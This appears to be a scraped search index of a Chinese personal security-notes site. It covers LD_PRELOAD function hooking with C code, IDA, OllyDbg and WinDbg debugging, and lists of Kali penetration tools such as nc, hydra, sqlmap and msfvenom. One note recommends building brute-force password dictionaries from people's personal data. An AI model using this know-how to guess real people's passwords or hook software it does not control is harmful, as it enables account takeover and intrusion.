沒特別意義 参考: http://bbs.chinaunix.net/thread-2315852-1-1.html 栈 机器执行计算是通过栈进行操作的, ESP 总是指向栈顶, EBP 指向栈基址 栈从内存高地址向低地址增长 断点 软件断点: INT3 中断 硬件断点: INT1 中断 内存断点: 利用保护页(可读, 可写, 可执行页) 实现一个Windows调试器 进程启动方式(两种) 由调试器启动进程 调试器附加到进程 相关Win32API: 启动进程: BOOL WINAPI Create ProcessA(\n  LPCSTR IpApplicationName,\n  LPTSTR IpCommandLine,\n  LPSECURITY_ATTRIBUTES IpProcessAttributes,\n  LPSECURITY_ATTRIBUTES IpThreadAttributes,\n  BOOL bInheritHandles,\n  DWORD dwCreationFlags,\n  LPVOID IpEnvironment,\n  LPCTSTR IpCurrentDirectory,\n  LPSTARTUPINFO IpStartupInfo,\n  LPPROCESS_INFORMATION IpProcessInformation\n) 附加到进程前的打开进程句柄: HANDLE WINAPI OpenProcess(\n  DWORD dwDesiredAccess,\n  BOOL bInheritHandle\n  DWORD dwProcessId\n) 附加到进程: BOOL WINAPI DebugActiveProcess(\n  DWORD dwProcessId\n)","tags":"安全","url":"/yq-docs-Safety-Python-gray-hat.html","loc":"/yq-docs-Safety-Python-gray-hat.html"},{"title":"实战-Ubuntu16下Hook系统的open","text":"因为上一篇的 实战-Mac下Hook其他进程 失败了,\n然后找原因啊, 巴拉巴拉的, 就有了这个 Hook标准库的open 注解 此篇幅本也是想用add的, 但是估计是动态库的使用方式不对,\n所以最终还是换成了系统的动态库里面的open调用 下方源码主要看open, add后面再看啥问题 test3.c源码: #include <stdio.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n\nint add(int a, int b){ return a+b+3; }\n\nint main(){\n  int a = 200;\n  int b = 300;\n  int ret = add(a, b);\n  printf(\"a + b = %d + %d = %d\\n\", a, b, ret);\n\n  int fd = open(\"test3.c\", O_RDONLY) ;\n  if (fd != -1){\n    printf(\"open t3 success\\n\");\n  } else {\n    printf(\"open t3 failed\\n\");\n  }\n  close(fd);\n\n  return 0;\n} 编译为执行文件: gcc -g -o test3 test3.c 然后是hook的代码hookt3.c: #include \"stdio.h\"\n\nint add(int a, int b){\n\n  printf(\"===hook in====\");\n  int ret = a + b + 100;\n  printf(\"===hook out===\");\n  return ret;\n}\n\nextern int __open(char *,int,int);\n//打开文件\nint open(char * path,int flags,int mode)\n{\n  //输出打开的文件名\n  printf(\"=======hook open :%s\\n\",path);\n  int ret =  __open(path,flags,mode);\n  printf(\"===hoot fd: %d \\n\", ret);\n  return ret;\n  // return 0;\n} 编译为动态库: gcc -shared -fPIC  -g -o libhkt2.so hookt3.c 单独执行: $ ./test3\na + b = 200 + 300 = 503\nopen t3 success 加hook库: $ LD_PRELOAD=./libhkt2.so ./test3\na + b = 200 + 300 = 503\n=======hook open :test3.c\n===hoot fd: 3\nopen t3 success ldd对比下加载库顺序: root@740ff0ad5041:~/project/test# ldd test3\n  linux-vdso.so.1 =>  (0x00007fff657c8000)\n  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5d2fd2a000)\n  /lib64/ld-linux-x86-64.so.2 (0x00007f5d300f4000) 做了 LD_PRELOAD 的: root@740ff0ad5041:~/project/test# LD_PRELOAD=./libhkt2.so ldd test3\n=======hook open :/dev/tty\n===hoot fd: 3\n=======hook open :/usr/bin/ldd\n===hoot fd: 3\n  linux-vdso.so.1 =>  (0x00007ffebd48a000)\n  ./libhkt2.so (0x00007f9b745a3000)\n  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9b741d9000)\n  /lib64/ld-linux-x86-64.so.2 (0x00007f9b747a5000)\nroot@740ff0ad5041:~/project/test# 为什么open要使用双下划线前缀 使用__open对底层open函数进行hook,为什么定义的函数原型是: extern int __open(char *,int,int); 原因是:\n在GNU/Linux系统中,系统调用和库函数的名称带有前缀来区分。\n对应open系统调用的库函数名称是__open。 如果直接使用系统调用的 API,如 open()、write() 等,定义和调用时使用的是没有下划线前缀的名称,如 open()。 但是如果要对系统调用做 hook,那么 hook 函数的定义需要使用下划线前缀隐藏名称,如 __open()。 标准库函数如 strcpy()、printf() 等,直接使用和定义时也是没有下划线前缀。 只有在需要进行 hook 标准库函数时,hook 函数才使用下划线前缀隐藏名称,如 __strcpy() 等。 Hook标准库的自定义的add 经过不懈努力, 终于在linux上成功了, 之前编译顺序问题导致一直失败 ub16正确编译带库的执行文件: gcc -o test3 test3.c -luadd -L./ -g 换个顺序就是错的: // error, 找不到add\ngcc -luadd -L./ -g -o test3 test3.c 自定义一个动态库, 实现add函数 add.h: int add(int a, int b); add.c: #include \"add.h\"\n\nint add(int a, int b){\n  return a+b+300;\n} 将add编译为uadd库: gcc -shared -fPIC -g -o libuadd.so add.c 入口执行文件test3.c: #include <stdio.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include \"add.h\"\n\nint main(){\n\n  int a = 200;\n  int b = 300;\n  int ret = add(a, b);\n  printf(\"a + b = %d + %d = %d\\n\", a, b, ret);\n\n  int fd = open(\"test3.c\", O_RDONLY) ;\n  if (fd != -1){\n    printf(\"open t3 success\\n\");\n  } else {\n    printf(\"open t3 failed\\n\");\n  }\n\n  close(fd);\n  return 0;\n\n}\n\n// linux下  -o test3 test3.c 得在最前面, 不然找不到add\n// gcc -o test3 test3.c -luadd -L./ -g\n// gcc -g -o test3 test3.c 编译为执行文件: gcc -o test3 test3.c -luadd -L./ -g hook的库源码hookt3.c: #include <stdio.h>\n\nint add(int a, int b){\n\n  printf(\"===hook in add====\\n\");\n  int ret = a + b + 100;\n  printf(\"===hook out add===\\n\");\n  return ret;\n}\n\nextern int __open(char *,int,int);\n//打开文件\nint open(char * path,int flags,int mode)\n{\n  //输出打开的文件名\n  printf(\"=======hook open :%s\\n\",path);\n  int ret =  __open(path,flags,mode);\n  printf(\"===hoot fd: %d \\n\", ret);\n  return ret;\n    // return 0;\n}\n\n// gcc -shared -fPIC  -g -o libhkt2.so hookt3.c\n// LD_LIBRARY_PATH=./ LD_PRELOAD=./libhkt2.so ./test3 编译为动态库hkt2: gcc -shared -fPIC  -g -o libhkt2.so hookt3.c 现在可以来测试了, 当不插入hook动态库时候: $ LD_LIBRARY_PATH=./ ./test3\na + b = 200 + 300 = 800\nopen t3 success 注解 此处使用 LD_LIBRARY_PATH 是因为, 调用了当前自己编的动态库, 这样才能找到\n不这样的话, 要么写到系统库路径去, 要么重写下ldconf 当插入hook时: $ LD_LIBRARY_PATH=./ LD_PRELOAD=./libhkt2.so ./test3\n===hook in add====\n===hook out add===\na + b = 200 + 300 = 600\n=======hook open :test3.c\n===hoot fd: 3\nopen t3 success 重要 LD_PRELOAD 只是预加载动态库的,\n如果add直接是源码写在了执行文件, 或者add在静态库, 那么这种方法就不行了","tags":"安全","url":"/yq-docs-Safety-Reverse-Engineering-Actual-combat-Open-of-the-HOOK-system-under-the-HOOK-system-under16.html","loc":"/yq-docs-Safety-Reverse-Engineering-Actual-combat-Open-of-the-HOOK-system-under-the-HOOK-system-under16.html"},{"title":"IDA工具","text":"IDA是一款强大的反编译工具, 支持跨平台 官网: https://hex-rays.com/ida-free/#download IDA全称是交互式反汇编器专业版（Interactive Disassembler Professional），人们其简称为IDA，\n是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器！ IDA Pro是一款交互式的，可编程的，可扩展的，多处理器的，交叉Windows或Linux WinCE MacOS平台主机来分析程序，\n被公认为最好的花钱可以买到的逆向工程利器。IDA Pro已经成为事实上的分析敌意代码的标准并让其自身迅速成为攻击研究领域的重要工具。\n它支持数十种CPU指令集其中包括Intel x86，x64，MIPS，PowerPC，ARM，Z80，68000，c8051等等。 IDA（Interactive Disassembler）是一款强大的逆向工程工具，\n用于分析和逆向编译二进制文件（如可执行文件、动态链接库等）。\n它提供了广泛的功能和特性，使逆向工程师能够深入研究和理解二进制文件的结构、逻辑和功能。 以下是一些IDA的主要特点和功能： 反汇编和分析：IDA能够将二进制文件反汇编为可读的汇编代码，\n使用户能够查看和理解程序的底层指令和操作。\n它可以对程序进行静态分析，提取函数、变量、控制流图等信息，并提供高级的图形化界面来展示分析结果。 交互式调试：IDA具有内置的调试功能，可以与调试器集成，\n允许用户在逆向分析过程中跟踪和调试二进制文件。\n它支持断点设置、单步执行、寄存器和内存查看等调试操作，帮助用户理解程序的执行过程和状态。 可扩展性：IDA支持插件和脚本，使用户能够根据自己的需求定制和扩展工具的功能。\n用户可以编写脚本来自动化分析任务、执行自定义的分析算法或添加新的功能模块。 支持多种平台和文件格式：IDA可以处理多种不同的二进制文件格式和处理器架构， 包括x86、ARM、MIPS等。它还支持多个操作系统，包括Windows、Linux、macOS等。 IDA在逆向工程、恶意代码分析、漏洞研究等领域被广泛使用。\n它为逆向工程师提供了强大的工具和功能，以帮助他们深入研究和分析二进制文件，\n理解程序的内部工作原理，并发现其中的潜在问题和漏洞。 入门教程: https://blog.csdn.net/qq_47403671/article/details/119939585 布局 左侧窗口为函数列表窗口 右侧窗口为IDA反汇编所得的汇编代码 最下侧窗口为文件在反汇编过程中的信息。 菜单 File：用于打开、新建、装载、保存、关闭一个文件或是数据库 Edit：用于编辑反汇编代码 Jump：用于跳转到某个位置、地址或是一个窗口 Search：用于搜索代码段、数据、错误等等 View：用于显示文件内容的显示方式 Debugger：调试器，集成在IDA中 Lumina：对元数据进行各种操作 Options：可以进行一些个性化的设置 快捷键 Ctrl+Enter 前进 Esc 后退 space(空格) 切换视图格式或者代码格式 A 显示硬编码-以字符串显示 C 显示硬编码-以code形式显示 D 显示硬编码-以数据形式显示, 按一次表示1个字节, 2次表示两个字节(dw), 3次表示4字节 U 显示硬编码-undefined (以原始字节显示) G 跳转到给定的地址 ALT + T 搜索 CTRL + T 再次搜索 N 更改变量的名称 P 创建函数 ALT + Q 修改为指定的结构体类型 (全局变量) T 修改为指定的结构体类型 (局部变量) ; (分号) 写注释 (注释会在调用/引用位置同步显示) : (冒号) + shift + ; (分号) 写注释 (注释只会在写的位置显示) X 查看引用, 对着某个函数、变量按该快捷键，可以查看它的交叉引用 y 更改变量的类型 F2 在所在行下断点 F5 快速反汇编，将文件汇编语言转换成伪代码，便于使用者对其进行分析。 可以将ARM指令转化为可读的C代码，同时可以使用Y键，对JNIEnv指针做一个类型转换，从而对JNI里经常使用的JNIEnv方法能够识别 比如快速转换为C 尽量不用, 因为不会很准确, 识别不了的地方会省略, 且没有直接看汇编代码清晰 F7 单步步进, 单步进入调试 F8 单步步过, 按照顺序一行一行，单步调试 F9 继续运行程序, 直接跳到下一个断点处 F4 运行到光标所在行 Ctrl + F7 直到该函数返回时才停止 Ctrl + F2 终止一个正在运行的进程 Shift + F12 查看String,\n快速查看so文件中的字符串信息，分析过程中通过一些关键字符串能够迅速定位到关键函数 Ctrl + s 有两个用途， 在IDA View页面中可以查看文件so文件的所有段信息 在调试页面可以查看程序中所有so文件映射到内存的基地址 注解 tips: 在进行so调试过程中，很有用的一个小技巧就是IDA双开， 一个用于进行静态分析；一个用于动态调试。比如说调试过程中要找到一个函数的加载到内存中的位置， IDA部分前缀含义 sub_        指令和子函数起点\nlocret_     返回指令\nloc_        指令\noff_        数据，包含偏移量\nseg_        数据，包含段地址值\nasc_        数据，ASCII字符串\nbyte_       数据，字节（或字节数组）\nword_       数据，16位数据（或字数组）\ndword_      数据，32位数据（或双字数组）\nqword_      数据，64位数据（或4字数组）\nflt_        浮点数据，32位（或浮点数组）\ndbl_        浮点数，64位（或双精度数组）\ntbyte_      浮点数，80位（或扩展精度浮点数）\nstru_       结构体(或结构体数组)\nalgn_       对齐指示\nunk_        未处理字节 程序基址(Rebase Program) 注解 有的地方说法是: 目标函数实际地址=函数偏移+so基址+1，\n+1是因为要标识arm和thumb指令区别； 计算: 偏移后模块基地址 = 偏移前模块基地址 + ASLR偏移 每次下断点的时候，都是通过先手工在IDA里查看的偏移前模块基地址，再手工在LLDB里查看ASLR偏移，最后手工在计算器里将两者相加的方式来计算偏移后模块基地址的，虽然结果可以保证100%正确，但操作流程稍有些复杂 如何才能只手工操作一次，就可以搞定所有断点的地址。那就是让IDA直接显示计算好的偏移后模块基地址? 首先在LLDB里查看待分析模块的ASLR偏移: (lldb) image list -o -f\n[  0] 0x00000000000a0000 /var/containers/Bundle/Application/046BD91B-E9FB-4C77-8EC3-908237232716/TargetApp.app/TargetApp(0x00000001000a0000)\n... 这里ASLR偏移是 0x00000000000a0000 。 然后打开IDA设置rebase program: 首先将鼠标光标点击到IDA右边的界面，这样才会有我们需要设置的选项。 在菜单上的\"Edit\"、\"Segments\"、\"Rebase program...\"里将\"Value\"的值加上TargetApp的ASLR偏移， 可以看到起始的地址是0x100000000, 加上ASLR偏移地址: 参考: IDA调试技巧（妥妥的干货分享） IDA设置条件记录断点 参考: ida设置条件记录断点 更详细的: IDA断点和搜索 设置内存断点 内存断点属于硬件断点, 而上面的条件记录的代码断点式软件断点 内存断点需要提前配置数据块信息 流程: 在代码区，g到找到的数据块地址。 在数据块首地址按下F2,设置断点。 因为这个断点所在位置不是代码块，IDA会弹出设置对话框。可以在里面填数据块长度。 非必须，去看看断点列表，看看内存断点和执行断电的区别。 内存访问断点和执行断点的区别 可以看到： 执行断点是软件断点。 内存访问断点是硬件断点。 参考: IDA动态调试---设置内存断点（半转载） 远程调试 ida支持远程调试Windows、linux、Android、Mac OS的二进制文件，\n将文件放在远程的对应系统服务器上，ida远程连接服务器，在服务器上运行、调试程序，\n并在本地客户端显示调试界面。界面视图上和本地调试并没有区别。 如果需要远程调试，首先需要将ida的服务端部署在远程服务器上，ida的服务端存储在ida目录中的dbgsrv文件中 将需要调试的文件和服务端版本放入服务器中，然后运行服务端，会默认在23946端口启动ida服务端程序，以linux为例\n被调试程序是64位elf文件，所以在linux端运行linux_server64，然后回到客户端 客户端的第一步没什么变化，在菜单选择debugger栏，在选择debugger时，选择Remote Linux debugger 参考: ida使用技巧之动态调试 虚拟内存空间地址表 高2G空间 （Ring0级能访问区域） 0xFFFFFFFF-0xC0000000：1GB用于VxD、存储器管理和文件系统；\n\n0xBFFFFFFF-0x80000000：1GB共享的WIN32 DLL、存储器映射文件和共享存储区； 低2G空间（Ring3权限区域）: 0x7FFFFFFF-0x00400000：约2GB为每个进程的WIN32专用地址；\n\n0x003FFFFF-0x00001000：为MS-DOS系统 和 WIN16应用程序；\n\n0x00000FFF-0x00000000：为防止使用空指针的4,096字节； 同时顺便提醒一下，不管EXE或DLL基址都是可变的，但一个DLL加载到EXE后，基址会被重定向，但偏移地址是不变的； 于PE文件，PE头的长度并不是固定的，当然有着同样的解析标准，可也导致IDA中偏移地址-基址不一定等于文件地址， 判断代码在文件中的基址很容易，通常PE头在WinHex中可以清晰的看到\"This program cannot be run in DOS.....\"，\n之后就是一些段名称：如.text，.rdata。接着就是一小段00，之后出现数据的地方就是代码基址，大部分是55 8B或56 8B等。 参考(还有获取偏移地址说明): 逆向中静态分析工具——IDA初学者笔记 待看 参考这使用： IDA pro与x64dbg地址对齐 IDC脚本/指令 就是界面左下角的那个 DC是ida中支持的一门与C语言类似的语言，但是它是解释型的，\n并不是编译型的，于此同时IDC还融合了一些python中的元素以方便一些内容的处理。 执行IDC脚本一共有三种方式: idc命令行（菜单栏file->idc command）\n脚本文件 (菜单栏file->script file)\npython命令行（菜单栏file->python command） 注释 idc中使用C++风格的 // 进行单行注释； 采用c风格的 /* */ 进行多行注释。 帮助系统 ida为用户提供了一个很完备的帮助系统，可以使用F1快捷键打开帮助系统，\n其中点击\"index of idc functions\"可以看到对应一些idc的函数列表。 idc变量 idc在一个语句中可以生命多个变量，但是idc不支持c语言风格的数组、指针、结构体、联合等复杂的数据结构。 idc是一种松散的语言，变量没有明确的类型，其主要使用三种数据类型：整形（long）、字符串型、浮点值。 支持全局变量和局部变量 局部变量(auto): auto add,reg,val; //多个变量同时声明，未初始化\nauto valinit=0; //声明同时初始化 全局变量(extern): extern outval;\nextern illeval=\"wrong\" //非法定义，声明全局变量时不能进行初始化\nstatic main(){\n  extern insideval;\n  outval=\"global string\" //为全局变量赋值\n  insideval=1;\n} idc函数 idc中也可以自定义函数，其声明方式为: static func(arg1,arg2,arg3)\n{\n  statements ...\n} 用户定义函数不需要进行指定特定的参数类型，因为在需要的时候程序会自动进行转化。\n如果需要函数返回指定的值需要使用return进行指定，否则默认不显示返回一个值的函数都将返回零值。 idc语句 idc中支持C中的语句，除了switch。 idc表达式 idc几乎都能支持C语言中的操作运算表达（加减乘除、判等家族），但是明确说明不支持+=。 idc预定义符号 idc有一些符号是提前定义好了的，其内容和含义如下: _NT_           IDA is running under MS Windows\n_LINUX_        IDA is running under Linux\n_MAC_          IDA is running under Mac OS X\n_UNIX_         IDA is running under Unix (linux or mac)\n_EA64_         64-bit version IDA\n_QT_           GUI version of IDA (Qt)\n_GUI           GUI version of IDA\n_TXT_          Text version of IDA\n_IDA_VERSION_  The current IDA version. For example: \"7.5\"\n_IDAVER_       The current, numerical IDA version. For example: \"750\" means v7.5 idc字符串操作（切片） idc中对于字符串的操作应该是借鉴了python，其string类型的操作支持切片操作（slices） idc异常处理 idc异常处理中，可以使用的表达语句: auto e;\ntry\n{\n  ... some statements that cause a runtime error...\n}\ncatch ( e )\n{\n  // e holds the exception information\n  // it is an instance of the exception class\n}\n\n\nthrow xx;  #抛出 idc程序 如果只是需要进行简单的查询或者查看，可以直接编写个别行的函数完成编写，\n但是如果一个脚本应用需要执行大量的IDC程序，并且还可能会在很多场景下需要重复使用，\n那么我们可能需要创建一个独立的IDC程序文件。 IDC程序文件要求用户使用用户定义的函数，并且至少定义一个没有参数的main函数，\n此外主程序文件中必须包含idc.idc头文件: #idc程序文件基本结构\n#Include <idc.idc>\nstatic main(){\n  Message(\"this is a IDC scipt file\");\n} IDC支持如下C预处理指令: #include <文件> ；将指定的文件包含在当前文件中\n#define <宏名称>[可选项] ；创建宏，可以选择给宏分配指定的值\n#ifdef <名称>; 测试指定的宏是否存在\n#else 与ifdef一起使用\n#endif 通过ifdef指定定义终止符\n#undef <名称> ；删除指定的宏 参考: ida-IDC脚本剖析 一文解决IDA的IDC脚本语言入门教程 https://ybrc.github.io/zh-cn/14-2/ 3.1 IDA Pro编写IDC脚本入门 IDA 中的IDC脚本编写笔记 调试实操 使用IDA进行动态调试与过反调试","tags":"安全","url":"/yq-docs-Safety-Reverse-Engineering-IDA.html","loc":"/yq-docs-Safety-Reverse-Engineering-IDA.html"},{"title":"IDA-Pro","text":"官网: https://hex-rays.com/IDA-pro/ 这个分免费版付费版, 免费的好像就是普通的IDA","tags":"安全","url":"/yq-docs-Safety-Reverse-Engineering-IDA-PRO.html","loc":"/yq-docs-Safety-Reverse-Engineering-IDA-PRO.html"},{"title":"IDA-问题总结","text":"Mac下调试需要权限 Mac下一般使用默认的本地调试器, 由于权限问题无法启动 官方建议的解决方案是使用 远程调试 就是启动: /Applications/IDA\\ Pro\\ 7.5/idabin/dbgsrv/mac_server64 后在IDA Pro中选择 Remote Mac OS X debugger 参考: https://hex-rays.com/wp-content/static/tutorials/mac_debugger_primer2/mac_debugger_primer2.html 但是这个要求IDA Pro, 个人免费版不支持remote debug...","tags":"安全","url":"/yq-docs-Safety-Reverse-Engineering-IDA-Question-Summary.html","loc":"/yq-docs-Safety-Reverse-Engineering-IDA-Question-Summary.html"},{"title":"OllyDbg (OD)","text":"也简称OD, 是一个比较老的32位调试器工具, 只有Windows版本 看最后一次更新是2014年了, 我都还没高考 官网: http://www.ollydbg.de/ 中文站: http://www.ollydbg.org/ 摘自中文站的介绍: OllyDbg是一种具有可视化界面的32位汇编分析调试器，是一个新的动态追踪工具，\n将IDA与SoftICE结合起来的思想，Ring3级调试器，非常容易上手，\n己代替SoftICE成为当今最为流行的调试解密工具了。同时还支持插件扩展功能，是目前最强大的调试工具。 简单介绍可参考: https://zhuanlan.zhihu.com/p/95151936 使用可参考: https://blog.csdn.net/freeking101/article/details/101180621 汉化: https://developer.aliyun.com/article/865381 (没看上面中文站是不是有)","tags":"安全","url":"/yq-docs-Safety-Reverse-Engineering-Ollydbg.html","loc":"/yq-docs-Safety-Reverse-Engineering-Ollydbg.html"},{"title":"实战-Mac下Hook其他进程","text":"写一个测试的源码test2.cpp: #include \"stdio.h\"\n\nint add(int a, int b){\n  int tmp = a + 3;\n  return tmp + b;\n}\n\nextern \"C\"{\n  int add2(int a, int b){ return a+b+10;}\n}\n\nint sub(int a, int b){\n  return a-b;\n}\n\nvoid swap(int *a, int *b){\n  int *tmp;\n  *tmp = *a;\n  *a = *b;\n  *b = *tmp;\n}\n\nint main(){\n\n  int a = 10000;\n  int b = 10090;\n  int c = 10000;\n  int d = 10000;\n\n  int e[] = {10000, 10000, 5, 80};\n  int f[] = {10000, 5, 10000, 80};\n\n  int retAdd = add(a, b);\n  printf(\"a + b + 随机值= %d + %d + 3 = %d\\n\", a, b, retAdd);\n\n  printf(\"交换a, b的值, 交换前: a: %d; b: %d\\n\", a, b);\n  swap(&a, &b);\n  printf(\"交换a, b的值, 交换后: a: %d; b: %d \\n\", a, b);\n\n  // fflush();\n  return 0;\n\n} 将其编译为执行文件test2: // g++ -std=c++11 -dynamiclib -g -o libtest2.dylib test2.cpp\n// g++ -std=c++11 -g -l test2preutil -L /Users/yanque/project/code/TryTest  -o test2 test2.cpp\n/usr/bin/clang++ -std=gnu++14 -fcolor-diagnostics -fansi-escape-codes -g test2.cpp -o test2 编码钩子test2-hook-add-func.cpp: #include \"stdio.h\"\n#include <dlfcn.h>\n#include <stdio.h>\n#include <stdlib.h>\n\n// 定义原始函数指针类型\ntypedef int (*OrigAddFunc)(int a, int b);\n\nint add(int a, int b)\n{\n    OrigAddFunc orig_add = NULL;\n    orig_add = (OrigAddFunc)dlsym(RTLD_NEXT,\"_Z3addii\");\n    int tmp = orig_add(a, b);\n    fprintf(stderr, \"hook add; a + b = %d + %d = %d\", a, b, tmp);\n    fprintf(stderr, \"%s %d %d\\n\", __FILE__, __LINE__, tmp);\n    return tmp;\n} 编译为动态库 libtest2hook.dylib : g++ -std=c++11 -dynamiclib -o libtest2hook.dylib test2-hook-add-func.cpp 因为是Mac系统: DYLD_INSERT_LIBRARIES=`pwd`/libtest2hook.dylib ./test2 Linux环境变量是 LD_PRELOAD","tags":"安全","url":"/yq-docs-Safety-Reverse-Engineering-Real-Mac-under-other-processes-under-HOOK.html","loc":"/yq-docs-Safety-Reverse-Engineering-Real-Mac-under-other-processes-under-HOOK.html"},{"title":"WinDbg","text":"WinDbg 是一个调试器，可用于分析故障转储、\n调试实时用户模式和内核模式代码，以及检查 CPU 寄存器和内存。\n仅支持Windows 官网: 安装 Windows 调试器 官网调试教程: Windows 调试入门 看到个图文的使用: windbg使用超详细教程","tags":"安全","url":"/yq-docs-Safety-Reverse-Engineering-Windbg.html","loc":"/yq-docs-Safety-Reverse-Engineering-Windbg.html"},{"title":"汇编","text":"怎么用 参考: 如何阅读简单的汇编(持续更新) 逆向实操、x86/x64汇编、IDA pro静态分析 常见约定寄存器参数及作用 寄存器 作用 %rax 传递返回值 %rdi 传递第一个参数 %rsi 传递第二个参数 %rdx 传递第三个参数 %rcx 传递第四个参数 %r8 传递第五个参数 %r9 传递第六个参数 callee-owned %rsp 栈顶指针 caller-owned %rbx 临时变量 caller-owned %rbp 栈基指 caller-owned %r12-%15 临时变量 caller-owned %rip 存储下一条要执行的指令 %eflags flags和条件判断的结果标志位 xmmO 用来传递第一个double 参数 xmm1 用来传递第二个dioubie 參费 SP 栈寄存器 LR 保存函数返回地址 PC 当前运行到的地址 R0-R3 用来放函数的参数，执行完后，R0存放返回值 R4-R7 用来放函数的局部变量 注解 rdi是8字节的，4字节的时候对应的就是edi。 callee-owned: 如果caller要使用这些寄存机，那么它在调用callee前，要把这些寄存器保存好。 caller-owned: 如果callee要使用这些寄存器，那么它就要保存好这些寄存器的值，并且返回到caller的时候要将这些值恢复。","tags":"安全","url":"/yq-docs-Safety-Reverse-Engineering-compilation.html","loc":"/yq-docs-Safety-Reverse-Engineering-compilation.html"},{"title":"逆向工程","text":"主要是反编译这方面的 工具: frida Jadx: Java反编译工具: Jadx项目地址 Ghidra Cutter IDA IDA-问题总结 IDA-Pro OllyDbg WinDbg 汇编 实战-Mac下Hook其他进程 实战-Ubuntu16下Hook系统的open 一些没来的及研究的Hook相关 EAT Hook 挂钩技术 Inline Hook 挂钩技术 关于环境变量LD_PRELOAD的利用 LD_PRELOAD 后门 | Linux 后门系列 基于LD_PRELOAD的动态库函数hook LD_PRELOAD，patchelf 与 hook","tags":"安全","url":"/yq-docs-Safety-Reverse-Engineering-index.html","loc":"/yq-docs-Safety-Reverse-Engineering-index.html"},{"title":"学习记录","text":"渗透流程 phpStudy搭建 DVWA靶场搭建 Kali信息收集 Kali漏洞分析利用 为什么需要社工库? 因为大多数人的密码, 跟自己的生日QQ手机号等自己的信息相关 所以搜集后, 有利于进行构建爆破字典 如何增加经验 护网 挖漏洞; CNVD; SRC 靶场实战, 如使用Kali官方的: https://www.vulnhub.com/ 写博客; 公众号 可以试试去考的证书: 还有个软考信息安全工程师 可以平时逛逛的: 几乎所有国内的安全SRC","tags":"安全","url":"/yq-docs-Safety-Study-record-index.html","loc":"/yq-docs-Safety-Study-record-index.html"},{"title":"Brup","text":"macos使用brup 工具-burpsuite","tags":"安全","url":"/yq-docs-Safety-brup-index.html","loc":"/yq-docs-Safety-brup-index.html"},{"title":"Kali命令工具","text":"nmap: IP/端口扫描 maltego dirb: 服务目录扫描 whatweb: 服务框架扫描, VUE啥的 cmseek: 指纹扫描 msfconsole: 交互式漏洞搜索工具 hydra: 暴力破解帐密 medusa: 暴力破解帐密 sqlmap: 渗透数据库 wpscan: 漏洞扫描 strings: 以字符串形式 查看图片 exiftool: 查看文件注释 nc: nikto: wfuzz: 爆破 whois: 域名注册信息收集 shodan: IP地址信息收集 tor: 使用代理伪装 有些其实本来就是linux指令, 但在普通场景下一般用不到,\n所以放在此处. kali渗透专用指令 备忘, 云服务器厂商. 国外 msf index","tags":"安全","url":"/yq-docs-Safety-kali-Kali-command-tool.html","loc":"/yq-docs-Safety-kali-Kali-command-tool.html"},{"title":"kali渗透专用指令","text":"cmseek dirb exiftool fcrackzip hydra maltego masscan medusa msfconsole nc nikto nmap shodan sqlmap strings tor wfuzz whatweb whois wpscan","tags":"安全","url":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-index.html","loc":"/yq-docs-Safety-kali-Kali-penetration-special-instruction-index.html"},{"title":"MSF工具","text":"./MSF生成各种Payload msfvenom","tags":"安全","url":"/yq-docs-Safety-kali-MSF-index.html","loc":"/yq-docs-Safety-kali-MSF-index.html"},{"title":"Kali","text":"mac m1安装kali Kali安装配置 Kali命令工具 msf","tags":"安全","url":"/yq-docs-Safety-kali-index.html","loc":"/yq-docs-Safety-kali-index.html"},{"title":"贪心算法","text":"贪心策略:\n将求解过程分成若干个步骤，\n但每个步骤都应用贪心原则，\n选取当前状态下最好/最优的选择（局部最有利的选择），\n并以此希望最后堆叠出的结果也是最好/最优的解。 注解 由于是选取的局部最优, 所以最终结果不一样是全局最优的 一般步骤 从某个初始解出发； 采用迭代的过程，当可以向目标前进一步时，就根据局部最优策略，得到一部分解，缩小问题规模； 将所有解综合起来 例子: 需要找给顾客41分钱，现在的货币有 25 分、20分、10 分、5 分和 1 分四种硬币；\n该怎么办？ 按照贪心的三个步骤: 41分，局部最优化原则，先找给顾客25分； 此时，41-25=16分，还需要找给顾客10分，然后5分，然后1分； 最终，找给顾客一个25分，一个10分，一个5分，一个1分，共四枚硬币。 是不是觉得哪里不太对，如果给他2个20分，加一个1分，三枚硬币就可以了呢？&#94;_&#94;; 总结：贪心策略的优缺点 优点 简单，高效，省去了为了找最优解可能需要穷举操作，通常作为其它算法的辅助策略来使用； 缺点 不从总体上考虑其它可能情况，每次选取局部最优解，不再进行回溯处理，所以很少情况下得到最优解。 注解 当然, 如果能推导出 局部最优解能够构成全局最优解, 那么贪心策略才算真正的贪心算法\n(这里单纯意义上指能求出正确解的策略才是算法) 与动态规划的区别 贪心算法与动态规划的不同在于它对每个子问题的解决方案都做出选择，不能回退。 动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，有回退功能。 基于贪心算法的算法 Dijkstra(迪杰斯特拉)算法","tags":"数据结构","url":"/yq-docs-data-structure-Greedy-algorithm-index.html","loc":"/yq-docs-data-structure-Greedy-algorithm-index.html"},{"title":"elasticsearch","text":"es遇到的问题 介绍 配置 使用的7.13的版本，有一些配置过时了: |             过时配置             |        配置（新）        |\n| :------------------------------: | :----------------------: |\n| discovery.zen.ping.unicast.hosts |   discovery.seed_hosts   |\n|   discovery.zen.hosts_provider   | discovery.seed_providers |\n|   discovery.zen.nomasterblock    |  cluster.nomasterblock   | discovery.seed_hosts 提供集群中符合主机要求的节点的列表.\n每个值的格式为host:port或host ，其中port默认为设置transport.profiles.default.port。 discovery.seed_providers 以文件的方式提供主机列表，可以动态修改，而不用重启节点（容器化环境适用） cluster.initial_master_nodes 设置全新群集中符合主机要求的节点的初始集合.\n默认情况下，该列表为空，这意味着该节点希望加入已经被引导的集群 discovery.findpeersinterval 选定主节点发现时间间隔,默认1S 注解 自己测试中发现具有选举权的master节点一定要设置cluster.initial_master_nodes，\n值为当前所有可以参与选举的节点，否则会出现 \"master not discovered yet\" 的错误； 非master节点可以不设置，设置了反而会出现真正的master节点无法实时发现的问题，\n猜测原因可能是因为，单独的node节点因为设置了，所以与master节点不会主动发生通信 官网文档如下 Static Sets the initial set of master-eligible nodes in a brand-new cluster.\nBy default this list is empty, meaning that this node expects to join a cluster that has already been bootstrapped.\nSee cluster.initial_master_nodes . 